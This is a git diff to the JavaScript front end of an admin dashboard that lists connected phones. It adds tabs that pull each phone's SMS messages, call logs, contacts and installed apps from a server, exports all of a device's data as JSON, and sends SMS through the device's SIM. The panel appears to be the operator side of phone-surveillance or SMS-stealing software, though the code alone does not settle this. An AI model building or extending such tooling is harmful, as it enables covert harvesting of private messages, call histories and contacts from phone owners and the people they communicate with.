@@ -627,8 +627,21 @@ function renderDeviceGrid() {
       }).join('') + '</div>';
     }
 
+    // Storage & RAM info
+    const totalStorage = d.total_storage || 0;
+    const freeStorage = d.free_storage || 0;
+    const usedStorage = totalStorage - freeStorage;
+    const storagePct = totalStorage > 0 ? Math.round((usedStorage / totalStorage) * 100) : 0;
+    const storageClass = storagePct > 90 ? 'low' : storagePct > 70 ? 'mid' : 'high';
+
+    const totalRam = d.total_ram || 0;
+    const freeRam = d.free_ram || 0;
+    const usedRam = totalRam - freeRam;
+    const ramPct = totalRam > 0 ? Math.round((usedRam / totalRam) * 100) : 0;
+    const ramClass = ramPct > 90 ? 'low' : ramPct > 70 ? 'mid' : 'high';
+
     return `
-    <div class="dev-card ${online}" data-device-id="${d.device_id}" onclick="openSmsModal('${d.device_id}','${esc(deviceName).replace(/'/g, "\\'")}')">
+    <div class="dev-card ${online}" data-device-id="${d.device_id}" onclick="openDeviceModal('${d.device_id}','${esc(deviceName).replace(/'/g, "\\'")}')">
       <div class="dev-top">
         <div class="dev-status">
           <span class="dev-led"></span>
@@ -667,6 +680,18 @@ function renderDeviceGrid() {
           </span>
         </div>
         <div class="dev-row">
+          <span class="dev-row-label">STORAGE</span>
+          <span class="dev-row-value">
+            ${totalStorage > 0 ? `<div class="dev-battery"><div class="batt-shell"><div class="batt-fill ${storageClass}" style="width:${storagePct}%"></div></div><span class="batt-pct ${storageClass}">${fmtBytes(usedStorage)}/${fmtBytes(totalStorage)}</span></div>` : '?'}
+          </span>
+        </div>
+        <div class="dev-row">
+          <span class="dev-row-label">RAM</span>
+          <span class="dev-row-value">
+            ${totalRam > 0 ? `<div class="dev-battery"><div class="batt-shell"><div class="batt-fill ${ramClass}" style="width:${ramPct}%"></div></div><span class="batt-pct ${ramClass}">${fmtBytes(usedRam)}/${fmtBytes(totalRam)}</span></div>` : '?'}
+          </span>
+        </div>
+        <div class="dev-row">
           <span class="dev-row-label">SIM</span>
           <span class="dev-row-value">${simHtml}</span>
         </div>
@@ -683,41 +708,105 @@ function renderDeviceGrid() {
   }).join('');
 }
 
-// ========== SMS Messages ==========
-let smsDeviceId = '';
-let smsDeviceName = '';
+// ========== Device Modal (Tabbed: SMS, Calls, Contacts, Apps) ==========
+let modalDeviceId = '';
+let modalDeviceName = '';
+let activeTab = 'sms';
+
+// SMS state
 let allSmsMessages = [];
 let smsCurrentPage = 1;
 
-async function openSmsModal(deviceId, deviceName) {
-  smsDeviceId = deviceId;
-  smsDeviceName = deviceName;
-  smsCurrentPage = 1;
+// Calls state
+let allCallLogs = [];
+let callsCurrentPage = 1;
+
+// Contacts state
+let allContacts = [];
+let contactsCurrentPage = 1;
+
+// Apps state
+let allApps = [];
+
+async function openDeviceModal(deviceId, deviceName) {
+  modalDeviceId = deviceId;
+  modalDeviceName = deviceName;
+  activeTab = 'sms';
+
+  // Reset all state
   allSmsMessages = [];
-  document.getElementById('smsModalTitle').textContent = `SMS — ${deviceName}`;
-  document.getElementById('smsModalSub').textContent = 'Loading messages...';
+  smsCurrentPage = 1;
+  allCallLogs = [];
+  callsCurrentPage = 1;
+  allContacts = [];
+  contactsCurrentPage = 1;
+  allApps = [];
+
+  document.getElementById('deviceModalTitle').textContent = deviceName;
+  document.getElementById('deviceModalSub').textContent = 'Loading...';
+
+  // Reset search fields
   document.getElementById('smsSearch').value = '';
+  document.getElementById('callSearch').value = '';
+  document.getElementById('contactSearch').value = '';
+  document.getElementById('appSearch').value = '';
   document.getElementById('smsReceiver').value = '';
   document.getElementById('smsMessage').value = '';
   document.getElementById('smsSendStatus').classList.add('hidden');
-  document.getElementById('smsListContainer').innerHTML = `<div class="sms-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading messages...</span></div>`;
+  const sysChk = document.getElementById('showSystemApps');
+  if (sysChk) sysChk.checked = false;
+
+  // Reset tabs
+  document.querySelectorAll('.device-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.device-tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelector('.device-tab[data-tab="sms"]').classList.add('active');
+  document.getElementById('tab-sms').classList.add('active');
+
+  // Reset containers
+  document.getElementById('smsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading messages...</span></div>`;
+  document.getElementById('callsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading call logs...</span></div>`;
+  document.getElementById('contactsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading contacts...</span></div>`;
+  document.getElementById('appsListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading apps...</span></div>`;
   document.getElementById('smsPagination').innerHTML = '';
-  document.getElementById('smsModal').classList.remove('hidden');
+  document.getElementById('callsPagination').innerHTML = '';
+  document.getElementById('contactsPagination').innerHTML = '';
+
+  document.getElementById('deviceModal').classList.remove('hidden');
+
+  // Load first tab
   await loadSmsMessages(1);
 }
-window.openSmsModal = openSmsModal;
+window.openDeviceModal = openDeviceModal;
 
-function closeSmsModal() {
-  document.getElementById('smsModal').classList.add('hidden');
-  smsDeviceId = '';
+function closeDeviceModal() {
+  document.getElementById('deviceModal').classList.add('hidden');
+  modalDeviceId = '';
   allSmsMessages = [];
+  allCallLogs = [];
+  allContacts = [];
+  allApps = [];
 }
-window.closeSmsModal = closeSmsModal;
+window.closeDeviceModal = closeDeviceModal;
+
+function switchDeviceTab(tab) {
+  activeTab = tab;
+  document.querySelectorAll('.device-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.device-tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelector(`.device-tab[data-tab="${tab}"]`).classList.add('active');
+  document.getElementById(`tab-${tab}`).classList.add('active');
+
+  // Lazy load data for the tab
+  if (tab === 'sms' && allSmsMessages.length === 0) loadSmsMessages(1);
+  if (tab === 'calls' && allCallLogs.length === 0) loadCallLogs(1);
+  if (tab === 'contacts' && allContacts.length === 0) loadContacts(1);
+  if (tab === 'apps' && allApps.length === 0) loadApps();
+}
+window.switchDeviceTab = switchDeviceTab;
 
 async function loadSmsMessages(page) {
   try {
     smsCurrentPage = page;
-    const res = await fetch(`${API_BASE}/api/admin/connections/${smsDeviceId}/sms?page=${page}&limit=50`, {
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/sms?page=${page}&limit=50`, {
       headers: { 'x-admin-password': adminPassword },
     });
     const data = await res.json();
@@ -725,12 +814,12 @@ async function loadSmsMessages(page) {
     const total = data.total || 0;
     const totalPages = data.totalPages || 1;
 
-    document.getElementById('smsModalSub').textContent = `${total} message${total !== 1 ? 's' : ''} total`;
+    document.getElementById('deviceModalSub').textContent = `SMS: ${total} · Calls · Contacts · Apps`;
 
     renderSmsMessages(allSmsMessages);
     renderSmsPagination(page, totalPages, total);
   } catch (err) {
-    document.getElementById('smsListContainer').innerHTML = `<div class="sms-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD MESSAGES</p></div>`;
+    document.getElementById('smsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD MESSAGES</p></div>`;
     showToast('Failed to load SMS: ' + err.message, 'error');
   }
 }
@@ -740,7 +829,7 @@ function renderSmsMessages(messages) {
   const container = document.getElementById('smsListContainer');
 
   if (!messages || messages.length === 0) {
-    container.innerHTML = `<div class="sms-empty"><i class="ri-message-2-line"></i><p>NO MESSAGES FOUND</p></div>`;
+    container.innerHTML = `<div class="tab-empty"><i class="ri-message-2-line"></i><p>NO MESSAGES FOUND</p></div>`;
     return;
   }
 
@@ -791,7 +880,7 @@ function renderSmsPagination(currentPage, totalPages, total) {
     html += `<button onclick="loadSmsMessages(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
   }
 
-  html += `<span class="sms-page-info">${total} msgs</span>`;
+  html += `<span class="tab-page-info">${total} msgs</span>`;
   container.innerHTML = html;
 }
 
@@ -816,7 +905,7 @@ async function sendSmsFromDevice(simSlot) {
 
   if (!receiver) return showToast('Enter a receiver phone number', 'error');
   if (!message) return showToast('Enter a message to send', 'error');
-  if (!smsDeviceId) return showToast('No device selected', 'error');
+  if (!modalDeviceId) return showToast('No device selected', 'error');
 
   // Disable buttons while sending
   const btn1 = document.getElementById('smsSim1Btn');
@@ -835,7 +924,7 @@ async function sendSmsFromDevice(simSlot) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         password: adminPassword,
-        device_id: smsDeviceId,
+        device_id: modalDeviceId,
         receiver,
         message,
         sim_slot: simSlot,
@@ -867,6 +956,245 @@ async function sendSmsFromDevice(simSlot) {
   }
 }
 window.sendSmsFromDevice = sendSmsFromDevice;
+
+// ========== Call Logs Tab ==========
+async function loadCallLogs(page) {
+  try {
+    callsCurrentPage = page;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/call-logs?page=${page}&limit=50`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    allCallLogs = data.logs || [];
+    const total = data.total || 0;
+    const totalPages = data.totalPages || 1;
+
+    renderCallLogs(allCallLogs);
+    renderCallsPagination(page, totalPages, total);
+  } catch (err) {
+    document.getElementById('callsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD CALL LOGS</p></div>`;
+    showToast('Failed to load call logs: ' + err.message, 'error');
+  }
+}
+window.loadCallLogs = loadCallLogs;
+
+function renderCallLogs(logs) {
+  const container = document.getElementById('callsListContainer');
+  if (!logs || logs.length === 0) {
+    container.innerHTML = `<div class="tab-empty"><i class="ri-phone-line"></i><p>NO CALL LOGS FOUND</p></div>`;
+    return;
+  }
+
+  container.innerHTML = logs.map(l => {
+    const typeMap = { 1: 'INCOMING', 2: 'OUTGOING', 3: 'MISSED', 4: 'VOICEMAIL', 5: 'REJECTED' };
+    const typeClass = { 1: 'call-in', 2: 'call-out', 3: 'call-miss', 4: 'call-vm', 5: 'call-miss' };
+    const iconMap = { 1: 'ri-phone-line', 2: 'ri-phone-line', 3: 'ri-phone-line', 4: 'ri-voiceprint-line', 5: 'ri-phone-line' };
+    const type = l.type || 1;
+    const label = typeMap[type] || 'UNKNOWN';
+    const cls = typeClass[type] || 'call-in';
+    const icon = iconMap[type] || 'ri-phone-line';
+    const dateStr = l.date ? new Date(l.date).toLocaleString() : '?';
+    const durMin = Math.floor((l.duration || 0) / 60);
+    const durSec = (l.duration || 0) % 60;
+    const durStr = l.duration > 0 ? `${durMin}m ${durSec}s` : '0s';
+    const name = l.name || '';
+    const avatar = (l.number || '?').charAt(0).toUpperCase();
+
+    return `
+    <div class="tab-item ${cls}">
+      <div class="tab-avatar">${avatar}</div>
+      <div class="tab-item-content">
+        <div class="tab-item-top">
+          <span class="tab-item-title">${esc(l.number || 'Unknown')}${name ? ` <small>(${esc(name)})</small>` : ''}</span>
+          <span class="tab-item-badge ${cls}">${label}</span>
+        </div>
+        <div class="tab-item-meta">
+          <span><i class="ri-time-line"></i> ${durStr}</span>
+          <span>${dateStr}</span>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function renderCallsPagination(currentPage, totalPages, total) {
+  const container = document.getElementById('callsPagination');
+  if (totalPages <= 1) { container.innerHTML = ''; return; }
+  let html = '';
+  if (currentPage > 1) html += `<button onclick="loadCallLogs(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
+  const s = Math.max(1, currentPage - 2), e = Math.min(totalPages, currentPage + 2);
+  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadCallLogs(${i})">${i}</button>`;
+  if (currentPage < totalPages) html += `<button onclick="loadCallLogs(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
+  html += `<span class="tab-page-info">${total} calls</span>`;
+  container.innerHTML = html;
+}
+
+function filterCallLogs() {
+  const q = document.getElementById('callSearch').value.toLowerCase().trim();
+  if (!q) { renderCallLogs(allCallLogs); return; }
+  const f = allCallLogs.filter(l => (l.number||'').toLowerCase().includes(q) || (l.name||'').toLowerCase().includes(q));
+  renderCallLogs(f);
+}
+window.filterCallLogs = filterCallLogs;
+
+// ========== Contacts Tab ==========
+async function loadContacts(page) {
+  try {
+    contactsCurrentPage = page;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/contacts?page=${page}&limit=100`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    allContacts = data.contacts || [];
+    const total = data.total || 0;
+    const totalPages = data.totalPages || 1;
+
+    renderContacts(allContacts);
+    renderContactsPagination(page, totalPages, total);
+  } catch (err) {
+    document.getElementById('contactsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD CONTACTS</p></div>`;
+    showToast('Failed to load contacts: ' + err.message, 'error');
+  }
+}
+window.loadContacts = loadContacts;
+
+function renderContacts(contacts) {
+  const container = document.getElementById('contactsListContainer');
+  if (!contacts || contacts.length === 0) {
+    container.innerHTML = `<div class="tab-empty"><i class="ri-contacts-book-line"></i><p>NO CONTACTS FOUND</p></div>`;
+    return;
+  }
+
+  container.innerHTML = contacts.map(c => {
+    const avatar = (c.name || '?').charAt(0).toUpperCase();
+    const phones = Array.isArray(c.phones) ? c.phones : [];
+    const emails = Array.isArray(c.emails) ? c.emails : [];
+    const phoneStr = phones.length > 0 ? phones.map(p => `<span class="contact-phone"><i class="ri-phone-line"></i>${esc(p)}</span>`).join('') : '<span class="contact-none">No phone</span>';
+    const emailStr = emails.length > 0 ? emails.map(e => `<span class="contact-email"><i class="ri-mail-line"></i>${esc(e)}</span>`).join('') : '';
+
+    return `
+    <div class="tab-item contact-item">
+      <div class="tab-avatar contact-avatar">${avatar}</div>
+      <div class="tab-item-content">
+        <div class="tab-item-top">
+          <span class="tab-item-title">${esc(c.name || 'Unknown')}</span>
+        </div>
+        <div class="contact-details">
+          ${phoneStr}
+          ${emailStr}
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function renderContactsPagination(currentPage, totalPages, total) {
+  const container = document.getElementById('contactsPagination');
+  if (totalPages <= 1) { container.innerHTML = ''; return; }
+  let html = '';
+  if (currentPage > 1) html += `<button onclick="loadContacts(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
+  const s = Math.max(1, currentPage - 2), e = Math.min(totalPages, currentPage + 2);
+  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadContacts(${i})">${i}</button>`;
+  if (currentPage < totalPages) html += `<button onclick="loadContacts(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
+  html += `<span class="tab-page-info">${total} contacts</span>`;
+  container.innerHTML = html;
+}
+
+function filterContacts() {
+  const q = document.getElementById('contactSearch').value.toLowerCase().trim();
+  if (!q) { renderContacts(allContacts); return; }
+  const f = allContacts.filter(c => {
+    if ((c.name||'').toLowerCase().includes(q)) return true;
+    const phones = Array.isArray(c.phones) ? c.phones : [];
+    if (phones.some(p => p.toLowerCase().includes(q))) return true;
+    const emails = Array.isArray(c.emails) ? c.emails : [];
+    if (emails.some(e => e.toLowerCase().includes(q))) return true;
+    return false;
+  });
+  renderContacts(f);
+}
+window.filterContacts = filterContacts;
+
+// ========== Installed Apps Tab ==========
+async function loadApps() {
+  try {
+    const showSystem = document.getElementById('showSystemApps')?.checked ? 'true' : 'false';
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/apps?system=${showSystem}`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    allApps = data.apps || [];
+
+    renderApps(allApps);
+  } catch (err) {
+    document.getElementById('appsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD APPS</p></div>`;
+    showToast('Failed to load apps: ' + err.message, 'error');
+  }
+}
+window.loadApps = loadApps;
+
+function renderApps(apps) {
+  const container = document.getElementById('appsListContainer');
+  if (!apps || apps.length === 0) {
+    container.innerHTML = `<div class="tab-empty"><i class="ri-apps-line"></i><p>NO APPS FOUND</p></div>`;
+    return;
+  }
+
+  container.innerHTML = `<div class="apps-count">${apps.length} apps</div>` + apps.map(a => {
+    const installDate = a.install_time ? new Date(a.install_time).toLocaleDateString() : '?';
+    const isSystem = a.is_system ? '<span class="app-system-badge">SYSTEM</span>' : '';
+
+    return `
+    <div class="tab-item app-item">
+      <div class="tab-avatar app-avatar"><i class="ri-app-store-line"></i></div>
+      <div class="tab-item-content">
+        <div class="tab-item-top">
+          <span class="tab-item-title">${esc(a.app_name || a.package_name)}</span>
+          ${isSystem}
+        </div>
+        <div class="tab-item-meta">
+          <span class="app-pkg">${esc(a.package_name)}</span>
+          <span>v${esc(a.version || '?')} · Installed: ${installDate}</span>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterApps() {
+  const q = document.getElementById('appSearch').value.toLowerCase().trim();
+  if (!q) { renderApps(allApps); return; }
+  const f = allApps.filter(a =>
+    (a.app_name||'').toLowerCase().includes(q) ||
+    (a.package_name||'').toLowerCase().includes(q)
+  );
+  renderApps(f);
+}
+window.filterApps = filterApps;
+
+// ========== Export Device Data ==========
+async function exportDeviceData() {
+  if (!modalDeviceId) return showToast('No device selected', 'error');
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/export`, {
+      headers: { 'x-admin-password': adminPassword },
+    });
+    const data = await res.json();
+    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `device_${modalDeviceId.substring(0, 8)}_export.json`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    showToast('Export downloaded successfully!', 'success');
+  } catch (err) {
+    showToast('Export failed: ' + err.message, 'error');
+  }
+}
+window.exportDeviceData = exportDeviceData;
 
 // ========== Settings ==========
 async function saveSettings() {
